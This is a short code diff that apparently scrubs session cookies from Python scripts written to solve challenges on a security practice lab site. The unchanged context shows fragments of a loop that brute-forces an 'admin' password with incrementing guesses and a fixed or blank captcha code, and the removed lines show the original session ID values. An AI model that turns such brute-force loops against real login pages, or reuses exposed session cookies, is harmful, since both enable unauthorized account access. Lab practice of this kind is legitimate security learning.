@@ -34,7 +34,7 @@ import requests
 from bs4 import BeautifulSoup
 import re
 
-cookie = {'PHPSESSID':'9515090a314ddc0f6d7641af16f75fda'}
+cookie = {'PHPSESSID':'XXXXXXXXXXXXXXXXXX'}
 url = 'http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php'
 response = requests.get(url,cookies=cookie)
 
@@ -93,7 +93,7 @@ username = 'admin'
 submit = 'submit'
 
 pwd = 1000
-cookie = {'PHPSESSID':'9515090a314ddc0f6d7641af16f75fda'}
+cookie = {'PHPSESSID':'XXXXXXXXXXXXXXXXXXXXXXXX'}
 while True:
 	post = {"username":username,'pwd':pwd,'vcode':'zp9p','submit':submit}
 
@@ -125,7 +125,7 @@ username = 'admin'
 submit = 'submit'
 
 pwd = 1000
-cookie = {'PHPSESSID':'9515090a314ddc0f6d7641af16f75fda'}
+cookie = {'PHPSESSID':'XXXXXXXXXXXX'}
 while True:
 	post = {"username":username,'pwd':pwd,'vcode':'','submit':submit}
 
@@ -291,7 +291,7 @@ if __name__ == '__main__':
 
 	vcode = 100
 
-	cookie = {'PHPSESSID':'4d504a3e36f8dfe900dd7920cb26e8ee'}
+	cookie = {'PHPSESSID':'XXXXXXXXXXXXXXXXXXXXXX'}
 	while True:
 		
 		text = xcode(code,cookie)
